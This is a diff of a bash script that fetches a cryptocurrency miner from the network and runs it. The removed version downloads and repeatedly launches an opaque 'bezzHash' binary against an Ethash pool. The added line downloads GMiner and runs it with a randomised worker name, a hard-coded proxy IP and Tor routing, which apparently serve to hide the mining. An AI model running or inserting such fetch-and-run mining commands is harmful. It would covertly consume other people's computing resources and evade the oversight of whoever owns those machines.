@@ -1,16 +1,1 @@
-#!/bin/bash
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash && chmod +x bezzHash 
-
-./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 5s
-./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 5s
-./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-sleep 5s
-./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-
-./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-
-./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
-
-./bezzHash --url=stratum+tcp://teguhcong.aswes@ethash.poolbinance.com:1800 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.91/gminer_2_91_linux64.tar.xz && tar -xvf gminer_2_91_linux64.tar.xz && ./miner --algo ethash --server stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo tesBezzMiniZ-$(shuf -i 1-99 -n 1)) -p x -d 0 --log_newjob 0 --cuda 1 --watchdog 0 --proxy 176.53.133.217:57597 --Tor
